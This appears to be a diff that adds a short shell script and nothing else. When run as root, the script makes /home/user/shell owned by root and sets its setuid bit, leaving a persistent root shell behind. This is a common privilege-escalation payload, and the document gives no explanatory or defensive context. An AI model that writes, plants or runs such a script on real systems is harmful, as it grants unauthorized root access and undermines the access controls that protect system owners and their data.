@@ -1,0 +1,3 @@
+#!/bin/sh
+/bin/chown 0:0 /home/user/shell
+/bin/chmod u+s /home/user/shell
